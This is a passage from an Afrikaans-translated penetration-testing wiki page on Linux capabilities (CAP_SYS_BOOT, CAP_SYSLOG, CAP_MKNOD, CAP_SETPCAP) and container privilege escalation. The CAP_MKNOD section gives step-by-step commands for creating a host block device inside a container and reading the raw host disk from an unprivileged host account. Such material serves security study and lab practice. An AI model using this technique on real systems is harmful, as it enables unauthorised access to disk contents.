- [chw00t: chroot ontsnappingsinstrument](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel nie net die uitvoering van die `reboot(2)` stelselskakel vir stelsels herlaai in staat nie, insluitend spesifieke opdragte soos `LINUX_REBOOT_CMD_RESTART2` wat vir sekere hardewareplatforms aangepas is, maar dit stel ook die gebruik van `kexec_load(2)` en, vanaf Linux 3.17, `kexec_file_load(2)` in staat om nuwe of geskrewe crash-kernels te laai.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is in Linux 2.6.37 van die breër **CAP_SYS_ADMIN** geskei, wat spesifiek die vermoë verleen om die `syslog(2)` oproep te gebruik. Hierdie vermoë stel die sien van kernadresse via `/proc` en soortgelyke interfaces moontlik wanneer die `kptr_restrict` instelling op 1 is, wat die blootstelling van kernadresse beheer. Sedert Linux 2.6.39 is die standaard vir `kptr_restrict` 0, wat beteken dat kernadresse blootgestel word, hoewel baie verspreidings dit op 1 (versteek adresse behalwe van uid 0) of 2 (altyd adresse versteek) vir sekuriteitsredes stel.

Boonop stel **CAP_SYSLOG** toegang tot `dmesg` uitvoer toe wanneer `dmesg_restrict` op 1 gestel is. Ten spyte van hierdie veranderinge, behou **CAP_SYS_ADMIN** die vermoë om `syslog` operasies uit te voer weens historiese precedente.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) brei die funksionaliteit van die `mknod` stelselskakel uit, bo en behalwe die skep van gewone lêers, FIFOs (genaamde pype), of UNIX-domein sokke. Dit stel spesifiek die skepping van spesiale lêers in staat, wat insluit:

- **S_IFCHR**: Karakter spesiale lêers, wat toestelle soos terminaal is.
- **S_IFBLK**: Blok spesiale lêers, wat toestelle soos skywe is.

Hierdie vermoë is noodsaaklik vir prosesse wat die vermoë benodig om toestel lêers te skep, wat direkte hardeware-interaksie deur karakter of blok toestelle fasiliteer.

Dit is 'n standaard docker vermoë ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Hierdie vermoë maak dit moontlik om privaatheidsverhogings (deur volle skyflesing) op die gasheer te doen, onder hierdie voorwaardes:

1. Begin toegang tot die gasheer hê (Onbevoegd).
2. Begin toegang tot die houer hê (Bevoegd (EUID 0), en effektiewe `CAP_MKNOD`).
3. Gasheer en houer moet dieselfde gebruikersnaamruimte deel.

**Stappe om 'n Bloktoestel in 'n Houer te Skep en Toegang te Kry:**

1. **Op die Gasheer as 'n Standaard Gebruiker:**

- Bepaal jou huidige gebruikers-ID met `id`, bv. `uid=1000(standaardgebruiker)`.
- Identifiseer die teiken toestel, byvoorbeeld, `/dev/sdb`.

2. **Binne die Houer as `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Terug op die Gasheer:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Hierdie benadering laat die standaard gebruiker toe om toegang te verkry en moontlik data van `/dev/sdb` deur die houer te lees, deur gebruik te maak van gedeelde gebruikersnaamruimtes en toestemmings wat op die toestel gestel is.

### CAP_SETPCAP

**CAP_SETPCAP** stel 'n proses in staat om **die vermoënsstelle** van 'n ander proses te **verander**, wat die toevoeging of verwydering van vermoëns uit die effektiewe, erfbare en toegelate stelle moontlik maak. 'n Proses kan egter slegs vermoëns wat dit in sy eie toegelate stel besit, verander, wat verseker dat dit nie die voorregte van 'n ander proses bo sy eie kan verhoog nie. Onlangs het kernopdaterings hierdie reëls verskerp, wat `CAP_SETPCAP` beperk tot slegs die vermindering van die vermoëns binne sy eie of sy afstammelinge se toegelate stelle, met die doel om sekuriteitsrisiko's te verminder. Gebruik vereis dat `CAP_SETPCAP` in die effektiewe stel en die teikenvermoëns in die toegelate stel is, met `capset()` vir wysigings. Dit som die kernfunksie en beperkings van `CAP_SETPCAP` op, wat sy rol in voorregbestuur en sekuriteitsverbetering beklemtoon.

**`CAP_SETPCAP`** is 'n Linux vermoë wat 'n proses toelaat om **die vermoënsstelle van 'n ander proses te verander**. Dit bied die vermoë om vermoëns uit die effektiewe, erfbare en toegelate vermoënsstelle van ander prosesse toe te voeg of te verwyder. Daar is egter sekere beperkings op hoe hierdie vermoë gebruik kan word.

'n Proses met `CAP_SETPCAP` **kan slegs vermoëns toeken of verwyder wat in sy eie toegelate vermoënsstel is**. Met ander woorde, 'n proses kan nie 'n vermoë aan 'n ander proses toeken as dit nie daardie vermoë self het nie. Hierdie beperking verhoed dat 'n proses die voorregte van 'n ander proses bo sy eie vlak van voorreg verhoog.

Boonop is die `CAP_SETPCAP` vermoë in onlangse kernweergawe **verder beperk**. Dit laat nie meer 'n proses toe om arbitrêr die vermoënsstelle van ander prosesse te verander nie. In plaas daarvan **laat dit slegs 'n proses toe om die vermoëns in sy eie toegelate vermoënsstel of die toegelate vermoënsstel van sy afstammelinge te verlaag**. Hierdie verandering is ingestel om potensiële sekuriteitsrisiko's wat met die vermoë verband hou, te verminder.

Om `CAP_SETPCAP` effektief te gebruik, moet jy die vermoë in jou effektiewe vermoënsstel en die teikenvermoëns in jou toegelate vermoënsstel hê. Jy kan dan die `capset()` stelselskakel gebruik om die vermoënsstelle van ander prosesse te verander.

In samevatting, `CAP_SETPCAP` laat 'n proses toe om die vermoënsstelle van ander prosesse te verander, maar dit kan nie vermoëns toeken wat dit nie self het nie. Daarbenewens, weens sekuriteitskwessies, is die funksionaliteit in onlangse kernweergawe beperk om slegs die vermindering van vermoëns in sy eie toegelate vermoënsstel of die toegelate vermoënsstelle van sy afstammelinge toe te laat.

## Verwysings

**Die meeste van hierdie voorbeelde is geneem uit sommige laboratoriums van** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), so as jy hierdie privesc tegnieke wil oefen, beveel ek hierdie laboratoriums aan.

**Ander verwysings**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
